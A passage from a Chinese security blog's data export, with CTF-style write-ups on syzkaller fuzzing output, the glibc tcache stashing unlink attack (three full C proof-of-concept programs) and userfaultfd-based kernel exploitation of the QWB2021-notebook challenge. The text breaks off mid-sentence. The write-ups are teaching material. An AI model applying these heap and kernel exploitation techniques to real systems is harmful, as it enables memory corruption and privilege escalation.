mm/kasan/common.c:46 [inline] set_alloc_info mm/kasan/common.c:401 [inline] ____kasan_kmalloc.constprop.0+0x84/0xa0 mm/kasan/common.c:429 test_write+0x3f/0x70 [vuln_device] vfs_write+0x1bf/0x760 fs/read_write.c:603 ksys_write+0x100/0x210 fs/read_write.c:658 do_syscall_64+0x33/0x40 arch/x86/entry/common.c:46 entry_SYSCALL_64_after_hwframe+0x44/0xa9The buggy address belongs to the object at ffff88810686f800The buggy address is located 0 bytes inside ofThe buggy address belongs to the page:page:00000000a4947c90 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x10686ehead:00000000a4947c90 order:1 compound_mapcount:0flags: 0x200000000010200(slab|head)raw: 0200000000010200 ffffea0004335180 0000000300000003 ffff888100041280raw: 0000000000000000 0000000080080008 00000001ffffffff 0000000000000000page dumped because: kasan: bad access detectedMemory state around the buggy address: ffff88810686f900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ffff88810686f980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00&gt;ffff88810686fa00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc                   ^ ffff88810686fa80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc ffff88810686fb00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc==================================================================\n\n这里就是report给出的是kernel相关的信息，比如函数调用栈，以及寄存器信息等。\n至于这里为什么无法重现出我觉得一大原因就是我没对这个驱动载入设置自启动，导致一次kernel panic之后没有重新加载驱动（下班了不搞了！）。其实有kernel pwn基础的朋友读懂前面的log和kernel panic的信息都会特别轻松的，这里不详细说了！\n","categories":["FUZZ"],"tags":["FUZZ","LKM","syzkaller","syzlang"]},{"title":"tcache stashing unlink attack","url":"/2022/02/24/tcache-stashing-unlink-attack/","content":"tcache stashing unlink attack作为house of pig的基础，所在这一篇更新完了就会跟新house of pig以及SROP。\n首先，这种利用方式需要的条件就是存在calloc来申请chunk。\n在Glibc2.27以及到Glibc2.31下的tcache stashing unlink attack先看一下源码：\n  if (in_smallbin_range (nb))    &#123;      idx = smallbin_index (nb);      bin = bin_at (av, idx);      if ((victim = last (bin)) != bin)        &#123;          bck = victim-&gt;bk;\t  if (__glibc_unlikely (bck-&gt;fd != victim))\t    malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);          set_inuse_bit_at_offset (victim, nb);          bin-&gt;bk = bck;          bck-&gt;fd = bin;          if (av != &amp;main_arena)\t    set_non_main_arena (victim);          check_malloced_chunk (av, victim, nb);#if USE_TCACHE\t  /* While we&#x27;re here, if we see other chunks of the same size,\t     stash them in the tcache.  */\t  size_t tc_idx = csize2tidx (nb);\t  if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)\t    &#123;\t      mchunkptr tc_victim;\t      /* While bin not empty and tcache not full, copy chunks over.  */\t      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count\t\t     &amp;&amp; (tc_victim = last (bin)) != bin)\t\t&#123;\t\t  if (tc_victim != 0)\t\t    &#123;\t\t      bck = tc_victim-&gt;bk;\t\t      set_inuse_bit_at_offset (tc_victim, nb);\t\t      if (av != &amp;main_arena)\t\t\t\tset_non_main_arena (tc_victim);\t\t      bin-&gt;bk = bck;\t\t      bck-&gt;fd = bin;\t\t      tcache_put (tc_victim, tc_idx);\t            &#125;\t\t&#125;\t    &#125;#endif          void *p = chunk2mem (victim);          alloc_perturb (p, bytes);          return p;        &#125;    &#125;\n\n在源码的注释也写上了，当tcache没有满，其他bin没有空的情况下就会把其他bin当中的chunk put进tcache内，并且这一阶段是没有任何保护的。根据昨天的largebin attack可以很清楚的看出来，这两行代码是有问题的。\nbin-&gt;bk = bck;bck-&gt;fd = bin;\n\n接下来就用heap exploit2.31当中的poc来做演示(这个poc的方式很巧妙)。\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;inttypes.h&gt;static uint64_t victim = 0;int main(int argc, char **argv)&#123;\tsetbuf(stdout, 0);\tsetbuf(stderr, 0);\tchar *t1;\tchar *s1, *s2, *pad;\tchar *tmp;\tprintf(&quot;You can use this technique to write a big number to arbitrary address instead of unsortedbin attack\\n&quot;);\tprintf(&quot;\\n1. need to know heap address and the victim address that you need to attack\\n&quot;);\ttmp = malloc(0x1);\tprintf(&quot;victim&#x27;s address: %p, victim&#x27;s vaule: 0x%lx\\n&quot;, &amp;victim, victim);\tprintf(&quot;heap address: %p\\n&quot;, tmp-0x260);\tprintf(&quot;\\n2. choose a stable size and free six identical size chunks to tcache_entry list\\n&quot;);\tprintf(&quot;Here, I choose the size 0x60\\n&quot;);\tfor(int i=0; i&lt;6; i++)&#123;\t\tt1 = calloc(1, 0x50);\t\tfree(t1);\t&#125;\tprintf(&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\\n&quot;, \t\tt1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4, t1-0x60*5);\tprintf(&quot;\\n3. free two chunk with the same size like tcache_entry into the corresponding smallbin\\n&quot;);\ts1 = malloc(0x420);\tprintf(&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\\n&quot;, s1);\tpad = malloc(0x20);\tprintf(&quot;Alloc a padding chunk, avoid %p to merge to top chunk\\n&quot;, s1);\tfree(s1);\tprintf(&quot;Free chunk %p to unsortedbin\\n&quot;, s1);\tmalloc(0x3c0);\tprintf(&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\\n&quot;);\tmalloc(0x100);\tprintf(&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\\n&quot;);\tprintf(&quot;chunk %p is in smallbin[4], whose size is 0x60\\n&quot;, s1+0x3c0);\tprintf(&quot;Repeat the above steps, and free another chunk into corresponding smallbin\\n&quot;);\tprintf(&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\\n&quot;);\ts2 = malloc(0x420);\tpad = malloc(0x80);\tfree(s2);\tmalloc(0x3c0);\tmalloc(0x100);\tprintf(&quot;chunk %p is in smallbin[4], whose size is 0x60\\n&quot;, s2+0x3c0);\tprintf(&quot;smallbin[4] list is %p &lt;--&gt; %p\\n&quot;, s2+0x3c0, s1+0x3c0);\tprintf(&quot;\\n4. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\\n&quot;);\t\tprintf(&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\\n&quot;, s2+0x3c0, (uint64_t)(&amp;victim)-0x10);\t*(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;\tprintf(&quot;\\n5. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\\n&quot;);\tcalloc(1, 0x50);\tprintf(&quot;Finally, the victim&#x27;s value is changed to a big number\\n&quot;);\tprintf(&quot;Now, victim&#x27;s value: 0x%lx\\n&quot;, victim);\treturn 0;&#125;\t\n\n首先在这里放入六个chunk到tcache内\nfor(int i=0; i&lt;6; i++)&#123;    t1 = calloc(1, 0x50);    free(t1);&#125;\n\n\n下面几步是将一个size为0x60的chunk放入smallbins当中\ns1 = malloc(0x420);pad = malloc(0x20);free(s1);malloc(0x3c0);malloc(0x100);\n\n\n下面进行相同操作把chunk放入smallbin\ns2 = malloc(0x420);pad = malloc(0x80);free(s2);malloc(0x3c0);malloc(0x100);\n\n\n接着修改后一个chunk的bk指针为target-0x10\n*(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;\n\n\n随后用calloc申请一个smallbin当中的chunk让另一个进入tcache\ncalloc(1, 0x50);\n\n\n可以看到目标地址的值被改变了并且我们最后一个chunk也进入的tcache\n进一步分析以上就是这个漏洞的利用方式之一，和昨天的largebin attack类似，但是这个漏洞存在一个更具有破坏性的利用方式，注意上面的两行代码当中有一行是\nbin-&gt;bk = bck;\n\n这样就导致了我们的smallbin的bk发生了改变\n\n再看在glibc当中的定义\n#define last(b)      ((b)-&gt;bk)\n\n所以这也就导致了更具有破坏性的漏洞，我们可以任意地址申请堆块，并且可以看到tcache_put也是没有任何保护\nstatic __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123;  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will     detect a double free.  */  e-&gt;key = tcache;  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);&#125;\n\ntcache stashing unlink attack+根据上面的进一步分析我们继续来heap exploit里面的poc\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;inttypes.h&gt;static uint64_t victim[4] = &#123;0, 0, 0, 0&#125;;int main(int argc, char **argv)&#123;\tsetbuf(stdout, 0);\tsetbuf(stderr, 0);\tchar *t1;\tchar *s1, *s2, *pad;\tchar *tmp;\tprintf(&quot;You can use this technique to get a tcache chunk to arbitrary address\\n&quot;);\tprintf(&quot;\\n1. need to know heap address and the victim address that you need to attack\\n&quot;);\ttmp = malloc(0x1);\tprintf(&quot;victim&#x27;s address: %p, victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\\n&quot;, \t\t&amp;victim, victim[0], victim[1], victim[2], victim[3]);\tprintf(&quot;heap address: %p\\n&quot;, tmp-0x260);    \tprintf(&quot;\\n2. change victim&#x27;s data, make victim[1] = &amp;victim, or other address to writable address\\n&quot;);\tvictim[1] = (uint64_t)(&amp;victim);\tprintf(&quot;\\n3. choose a stable size and free five identical size chunks to tcache_entry list\\n&quot;);\tprintf(&quot;Here, I choose the size 0x60\\n&quot;);\tfor(int i=0; i&lt;5; i++)&#123;\t\tt1 = calloc(1, 0x50);\t\tfree(t1);\t&#125;\tprintf(&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\\n&quot;, \t\tt1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);\tprintf(&quot;\\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\\n&quot;);\ts1 = malloc(0x420);\tprintf(&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\\n&quot;, s1);\tpad = malloc(0x20);\tprintf(&quot;Alloc a padding chunk, avoid %p to merge to top chunk\\n&quot;, s1);\tfree(s1);\tprintf(&quot;Free chunk %p to unsortedbin\\n&quot;, s1);\tmalloc(0x3c0);\tprintf(&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\\n&quot;);\tmalloc(0x100);\tprintf(&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\\n&quot;);\tprintf(&quot;chunk %p is in smallbin[4], whose size is 0x60\\n&quot;, s1+0x3c0);\tprintf(&quot;Repeat the above steps, and free another chunk into corresponding smallbin\\n&quot;);\tprintf(&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\\n&quot;);\ts2 = malloc(0x420);\tpad = malloc(0x80);\tfree(s2);\tmalloc(0x3c0);\tmalloc(0x100);\tprintf(&quot;chunk %p is in smallbin[4], whose size is 0x60\\n&quot;, s2+0x3c0);\tprintf(&quot;smallbin[4] list is %p &lt;--&gt; %p\\n&quot;, s2+0x3c0, s1+0x3c0);\tprintf(&quot;\\n5. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\\n&quot;);\tprintf(&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\\n&quot;, s2+0x3c0, (uint64_t)(&amp;victim)-0x10);\t*(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;\tprintf(&quot;\\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\\n&quot;);\tcalloc(1, 0x50);\tprintf(&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\\n&quot;, \t\t&amp;victim, s2+0x3d0, t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);\tprintf(&quot;Apply to tcache_entry[4], you can get a pointer to victim address\\n&quot;);\t\tuint64_t *r = (uint64_t*)malloc(0x50);\tr[0] = 0xaa;\tr[1] = 0xbb;\tr[2] = 0xcc;\tr[3] = 0xdd;\tprintf(&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\\n&quot;, \t\tvictim[0], victim[1], victim[2], victim[3]);\t\treturn 0;&#125;\t\n\n首先，这里直放入了五个chunk到tcache\nfor(int i=0; i&lt;5; i++)&#123;    t1 = calloc(1, 0x50);    free(t1);&#125;\n\n然后后面是类似的放入两个chunk到smallbin，然后改变bk指针到我们的fake chunk，最后calloc我们的s1即可实现\n需要注意的是，这里victim[1] = (uint64_t)(&amp;victim);是需要将fake_chunk的bk指针指向任意可写地址！\n\n这个时候我们的利用危害性相对来说就比较大了，但是我们可以结合起来第一个漏洞来一起使用，也就是同时修改指定地址的值，并且在另一个地方创建fake chunk\ntcache stashing unlink attack++其实利用方式也很简单，就是我们修改fake chunk的bk指针就行，这里就不细说，把poc贴出来就行了(要恰饭了)\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;inttypes.h&gt;static uint64_t victim[4] = &#123;0, 0, 0, 0&#125;;static uint64_t victim2 = 0;int main(int argc, char **argv)&#123;\tsetbuf(stdout, 0);\tsetbuf(stderr, 0);\tchar *t1;\tchar *s1, *s2, *pad;\tchar *tmp;\tprintf(&quot;You can use this technique to get a tcache chunk to arbitrary address, at the same time, write a big number to arbitrary address\\n&quot;);\tprintf(&quot;\\n1. need to know heap address, the victim address that you need to get chunk pointer and the victim address that you need to write a big number\\n&quot;);\ttmp = malloc(0x1);\tprintf(&quot;victim&#x27;s address: %p, victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\\n&quot;, \t\t&amp;victim, victim[0], victim[1], victim[2], victim[3]);\tprintf(&quot;victim2&#x27;s address: %p, victim2&#x27;s value: 0x%lx\\n&quot;,\t\t&amp;victim2, victim2);\tprintf(&quot;heap address: %p\\n&quot;, tmp-0x260);\tprintf(&quot;\\n2. change victim&#x27;s data, make victim[1] = &amp;victim2-0x10\\n&quot;);\tvictim[1] = (uint64_t)(&amp;victim2)-0x10;\tprintf(&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\\n&quot;, \t\tvictim[0], victim[1], victim[2], victim[3]);\tprintf(&quot;\\n3. choose a stable size and free five identical size chunks to tcache_entry list\\n&quot;);\tprintf(&quot;Here, I choose the size 0x60\\n&quot;);\tfor(int i=0; i&lt;5; i++)&#123;\t\tt1 = calloc(1, 0x50);\t\tfree(t1);\t&#125;\tprintf(&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\\n&quot;, \t\tt1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);\tprintf(&quot;\\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\\n&quot;);\ts1 = malloc(0x420);\tprintf(&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\\n&quot;, s1);\tpad = malloc(0x20);\tprintf(&quot;Alloc a padding chunk, avoid %p to merge to top chunk\\n&quot;, s1);\tfree(s1);\tprintf(&quot;Free chunk %p to unsortedbin\\n&quot;, s1);\tmalloc(0x3c0);\tprintf(&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\\n&quot;);\tmalloc(0x100);\tprintf(&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\\n&quot;);\tprintf(&quot;chunk %p is in smallbin[4], whose size is 0x60\\n&quot;, s1+0x3c0);\tprintf(&quot;Repeat the above steps, and free another chunk into corresponding smallbin\\n&quot;);\tprintf(&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\\n&quot;);\ts2 = malloc(0x420);\tpad = malloc(0x80);\tfree(s2);\tmalloc(0x3c0);\tmalloc(0x100);\tprintf(&quot;chunk %p is in smallbin[4], whose size is 0x60\\n&quot;, s2+0x3c0);\tprintf(&quot;smallbin[4] list is %p &lt;--&gt; %p\\n&quot;, s2+0x3c0, s1+0x3c0);\tprintf(&quot;\\n5. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\\n&quot;);\tprintf(&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\\n&quot;, s2+0x3c0, (uint64_t)(&amp;victim)-0x10);\t*(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&amp;victim)-0x10;\tprintf(&quot;\\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\\n&quot;);\tcalloc(1, 0x50);\tprintf(&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\\n&quot;, \t\t&amp;victim, s2+0x3d0, t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);\tprintf(&quot;Apply to tcache_entry[4], you can get a pointer to victim address\\n&quot;);\t\tuint64_t *r = (uint64_t*)malloc(0x50);\tr[0] = 0xaa;\tr[1] = 0xbb;\tr[2] = 0xcc;\tr[3] = 0xdd;\tprintf(&quot;victim&#x27;s vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\\n&quot;, \t\tvictim[0], victim[1], victim[2], victim[3]);\tprintf(&quot;victim2&#x27;s value: 0x%lx\\n&quot;,\t\tvictim2);\treturn 0;&#125;\t\n\n\n参考链接https://github.com/StarCross-Tech/heap_exploit_2.31\n","categories":["pwn"],"tags":["tcache stashing unlink attack"]},{"title":"userfaultfd利用","url":"/2022/08/16/userfaultfd/","content":"其实这应该是kernelpwn基础中的一个，但是一直没有很关心，在最近做一道题目时又提到了这一利用方式，索性就把这玩意给先写了。\n简单理解userfaultfd 并不是一种攻击的名字，它是 Linux 提供的一种让用户自己处理缺页异常的机制，初衷是为了提升开发灵活性，在 kernel pwn 中常被用于提高条件竞争的成功率。比如在如下的操作时\ncopy_from_user(kptr, user_buf, size);\n\n如果在进入函数后，实际拷贝开始前线程被中断换下 CPU，别的线程执行，修改了 kptr 指向的内存块的所有权（比如 kfree 掉了这个内存块），然后再执行拷贝时就可以实现 UAF。这种可能性当然是比较小的，但是如果 user_buf 是一个 mmap 的内存块，并且我们为它注册了 userfaultfd，那么在拷贝时出现缺页异常后此线程会先执行我们注册的处理函数，在处理函数结束前线程一直被暂停，结束后才会执行后面的操作，大大增加了竞争的成功率。\n相关知识页调度与延迟加载有的内存既不在RAM也不在交换区，例如mmap创建的内存映射页。mmap页在read/write访问之前，实际上还没有创建（还没有映射到实际的物理页），例如：mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE, fd, 0); 内核并未将fd内容拷贝到0x1337000，只是将地址0x1337000映射到文件fd。\n当有如下代码访问时：\nchar *a = (char *)0x1337000printf(&quot;content: %c\\n&quot;, a[0]);\n\n若发生对该页的引用，则（1）为0x1337000创建物理帧，（2）从fd读内容到0x1337000，（3）并在页表标记合适的入口，以便识别0x1337000虚地址。如果是堆空间映射，仅第2步不同，只需将对应物理帧清0。\n总之，若首次访问mmap创建的页，会耗时很长，会导致上下文切换和当前线程的睡眠。\nuserfaultfd我对于他的理解就是，userfaultfd机制是用来处理页缺陷的，并且处理的handle函数我们也是可以控制的。正常的流程一般为下面几步。\nStep 1: 创建一个描述符uffd所有的注册内存区间、配置和最终的缺页处理等就都需要用ioctl来对这个uffd操作。ioctl-userfaultfd支持UFFDIO_API、UFFDIO_REGISTER、UFFDIO_UNREGISTER、UFFDIO_COPY、UFFDIO_ZEROPAGE、UFFDIO_WAKE等选项。比如UFFDIO_REGISTER用来向userfaultfd机制注册一个监视区域，这个区域发生缺页时，需要用UFFDIO_COPY来向缺页的地址拷贝自定义数据。\n# 2 个用于注册、注销的ioctl选项：UFFDIO_REGISTER                 注册将触发user-fault的内存地址UFFDIO_UNREGISTER               注销将触发user-fault的内存地址# 3 个用于处理user-fault事件的ioctl选项：UFFDIO_COPY                     用已知数据填充user-fault页UFFDIO_ZEROPAGE                 将user-fault页填零UFFDIO_WAKE                     用于配合上面两项中 UFFDIO_COPY_MODE_DONTWAKE 和                                UFFDIO_ZEROPAGE_MODE_DONTWAKE模式实现批量填充  # 1 个用于配置uffd特殊用途的ioctl选项：UFFDIO_API                      它又包括如下feature可以配置：                                UFFD_FEATURE_EVENT_FORK         (since Linux 4.11)                                UFFD_FEATURE_EVENT_REMAP        (since Linux 4.11)                                UFFD_FEATURE_EVENT_REMOVE       (since Linux 4.11)                                UFFD_FEATURE_EVENT_UNMAP        (since Linux 4.11)                                UFFD_FEATURE_MISSING_HUGETLBFS  (since Linux 4.11)                                UFFD_FEATURE_MISSING_SHMEM      (since Linux 4.11)                                UFFD_FEATURE_SIGBUS             (since Linux 4.14)// userfaultfd系统调用创建并返回一个uffd，类似一个文件的fduffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);\n\nSTEP 2. 用ioctl的UFFDIO_REGISTER选项注册监视区域// 注册时要用一个struct uffdio_register结构传递注册信息:// struct uffdio_range &#123;// __u64 start;    /* Start of range */// __u64 len;      /* Length of range (bytes) */// &#125;;//// struct uffdio_register &#123;// struct uffdio_range range;// __u64 mode;     /* Desired mode of operation (input) */// __u64 ioctls;   /* Available ioctl() operations (output) */// &#125;;addr = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)// addr 和 len 分别是我匿名映射返回的地址和长度，赋值到uffdio_registeruffdio_register.range.start = (unsigned long) addr;uffdio_register.range.len = len;// mode 只支持 UFFDIO_REGISTER_MODE_MISSINGuffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;// 用ioctl的UFFDIO_REGISTER注册ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register);\n\nSTEP 3. 创建一个处理专用的线程轮询和处理”user-fault”事件要使用userfaultfd，需要创建一个处理专用的线程轮询和处理”user-fault”事件。主进程中就要调用pthread_create创建这个自定义的handler线程：\n// 主进程中调用pthread_create创建一个fault handler线程pthread_create(&amp;thr, NULL, fault_handler_thread, (void *) uffd);\n\n一个自定义的线程函数举例如下，这里处理的是一个普通的匿名页用户态缺页，我们要做的是把我们一个已有的一个page大小的buffer内容拷贝到缺页的内存地址处。用到了poll函数轮询uffd，并对轮询到的UFFD_EVENT_PAGEFAULT事件(event)用拷贝(ioctl的UFFDIO_COPY选项)进行处理。\nstatic void * fault_handler_thread(void *arg)&#123;        // 轮询uffd读到的信息需要存在一个struct uffd_msg对象中    static struct uffd_msg msg;    // ioctl的UFFDIO_COPY选项需要我们构造一个struct uffdio_copy对象    struct uffdio_copy uffdio_copy;    uffd = (long) arg;      ......    for (;;) &#123; // 此线程不断进行polling，所以是死循环        // poll需要我们构造一个struct pollfd对象        struct pollfd pollfd;        pollfd.fd = uffd;        pollfd.events = POLLIN;        poll(&amp;pollfd, 1, -1);        // 读出user-fault相关信息        read(uffd, &amp;msg, sizeof(msg));        // 对于我们所注册的一般user-fault功能，都应是UFFD_EVENT_PAGEFAULT这个事件        assert(msg.event == UFFD_EVENT_PAGEFAULT);        // 构造uffdio_copy进而调用ioctl-UFFDIO_COPY处理这个user-fault        uffdio_copy.src = (unsigned long) page;        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &amp; ~(page_size - 1);        uffdio_copy.len = page_size;        uffdio_copy.mode = 0;        uffdio_copy.copy = 0;        // page(我们已有的一个页大小的数据)中page_size大小的内容将被拷贝到新分配的msg.arg.pagefault.address内存页中        ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy);          ......    &#125;&#125;\n\n例题：QWB2021-notebook题目分析qemu-system-x86_64 \\    -m 256M \\    -kernel bzImage \\    -initrd rootfs.cpio \\    -append &quot;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&quot; \\    -nographic \\    -net user \\    -net nic \\    -device e1000 \\    -smp cores=2,threads=2 \\    -cpu kvm64,+smep,+smap \\    -monitor /dev/null 2&gt;/dev/null \\    -s\n\n保护开启了smep，smap，kaslr进入系统可以看到还开启了kpti。\n题目就是一个菜单堆题：\n__int64 __fastcall mynote_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)&#123;    __int64 v3; // rdx    userarg notearg; // [rsp+0h] [rbp-28h] BYREF    ((void (__fastcall *)(file *))_fentry__)(file);    copy_from_user(&amp;notearg, v3, 0x18LL);    if ( cmd == 0x100 )        return noteadd(notearg.idx, notearg.size, notearg.buf);    if ( cmd &lt;= 0x100 )    &#123;        if ( cmd == 0x64 )            return notegift(notearg.buf);    &#125;    else    &#123;        if ( cmd == 0x200 )            return notedel(notearg.idx);        if ( cmd == 0x300 )            return noteedit(notearg.idx, notearg.size, notearg.buf);    &#125;    printk(&quot;[x] Unknown ioctl cmd!\\n&quot;, notearg.size, notearg.buf);    return -100LL;&#125;\n\n__int64 __fastcall noteadd(size_t idx, size_t size, void *buf)&#123;    __int64 v3; // rdx    __int64 v4; // r13    note *v5; // rbx    size_t v6; // r14    __int64 v7; // rbx    _fentry__(idx);    if ( idx &gt; 0xF )    &#123;        v7 = -1LL;        printk(&quot;[x] Add idx out of range.\\n&quot;, size);    &#125;    else    &#123;        v4 = v3;        v5 = &amp;notebook[idx];        raw_read_lock(&amp;lock);        v6 = v5-&gt;size;        v5-&gt;size = size;        if ( size &gt; 0x60 )        &#123;            v5-&gt;size = v6;            v7 = -2LL;            printk(&quot;[x] Add size out of range.\\n&quot;);        &#125;        else        &#123;            copy_from_user(name, v4, 0x100LL);            if ( v5-&gt;note )            &#123;                v5-&gt;size = v6;                v7 = -3LL;                printk(&quot;[x] Add idx is not empty.\\n&quot;);            &#125;            else            &#123;                v5-&gt;note = (void *)_kmalloc(size, 0x24000C0LL);                printk(&quot;[+] Add success. %s left a note.\\n&quot;, name);                v7 = 0LL;            &#125;        &#125;        raw_read_unlock(&amp;lock);    &#125;    return v7;&#125;\n\n在create函数里，是首先将对应位置的size放到栈上，随后直接把输入的size放到了储存size的地址，并且接着就是一个copy_from_user。\n__int64 __fastcall noteedit(size_t idx, size_t newsize, void *buf)&#123;    __int64 v3; // rdx    __int64 v4; // r13    note *v5; // rbx    size_t size; // rax    __int64 v7; // r12    __int64 v8; // rbx    _fentry__(idx);    if ( idx &gt; 0xF )    &#123;        v8 = -1LL;        printk(&quot;[x] Edit idx out of range.\\n&quot;, newsize);        return v8;    &#125;    v4 = v3;    v5 = &amp;notebook[idx];    raw_read_lock(&amp;lock);    size = v5-&gt;size;    v5-&gt;size = newsize;    if ( size == newsize )    &#123;        v8 = 1LL;        goto editout;    &#125;    v7 = (*(__int64 (__fastcall **)(void *, size_t, __int64))krealloc.gap0)(v5-&gt;note, newsize, 0x24000C0LL);    copy_from_user(name, v4, 0x100LL);    if ( !v5-&gt;size )    &#123;        printk(&quot;free in fact&quot;);        v5-&gt;note = 0LL;        v8 = 0LL;        goto editout;    &#125;    if ( (unsigned __int8)_virt_addr_valid(v7) )    &#123;        v5-&gt;note = (void *)v7;        v8 = 2LL;        editout:        raw_read_unlock(&amp;lock);        printk(&quot;[o] Edit success. %s edit a note.\\n&quot;, name);        return v8;    &#125;    printk(&quot;[x] Return ptr unvalid.\\n&quot;);    raw_read_unlock(&amp;lock);    return 3LL;&#125;\n\n可以看到虽然在create函数存在size的验证，但是在edit函数不存在任何验证，并且一样是在krealloc之后就有一个copy_from_user。\n__int64 __fastcall notegift(void *buf)&#123;    _fentry__(buf);    printk(&quot;[*] The notebook needs to be written from beginning to end.\\n&quot;);    copy_to_user(buf, notebook, 0x100LL);    printk(&quot;[*] For this special year, I give you a gift!\\n&quot;);    return 100LL;&#125;\n\n这里的gift函数就是把所有堆地址给泄露出来。\n利用分析那么就上面分析出来的结果可以得出目前的利用思路就是，首先利用userfaultfd机制形成一个UAF的堆块，然后利用结构中含有指针的结构体进行堆喷，那么我们就可以进一步的泄漏出地址出来。下一步就是我们可以修改指针进行栈迁移，我们可以把ROP链写在另外一个堆上面，因为可以泄露堆地址的缘故所以我们可以直接栈迁移到写了ROP链的堆上面。这里使用的结构体是tty_struct，其中有tty_operations是一个类似于vtable的函数表，所以我们利用三个堆块即可完成利用。\n上面是常规思路，这里主要写一下新的思路。\n内核中存在这样一个函数：\nstruct work_for_cpu &#123;    struct work_struct work;    long (*fn)(void *);    void *arg;    long ret;&#125;;static void work_for_cpu_fn(struct work_struct *work)&#123;    struct work_for_cpu *wfc = container_of(work, struct work_for_cpu, work);    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);&#125;\n\n上面函数在编译过后表达的形式其实是：\nstatic void work_for_cpu_fn(size_t * args)&#123;    args[6] = ((size_t (*) (size_t)) (args[4](args[5]));&#125;\n\n该函数位于 workqueue 机制的实现中，只要是开启了多核支持的内核 （CONFIG_SMP）都会包含这个函数的代码。不难注意到，这个函数非常好用，只要能控制第一个参数指向的内存，即可实现带一个任意参数调用任意函数，并把返回值存回第一个参数指向的内存的功能，且该 “gadget” 能干净的返回，执行的过程中完全不用管 SMAP、SMEP 的事情。由于内核中大量的 read / write / ioctl 之类的实现的第一个参数也都恰好是对应的对象本身，可谓是非常的适合这种场景了。考虑到我们提权需要做的事情只是 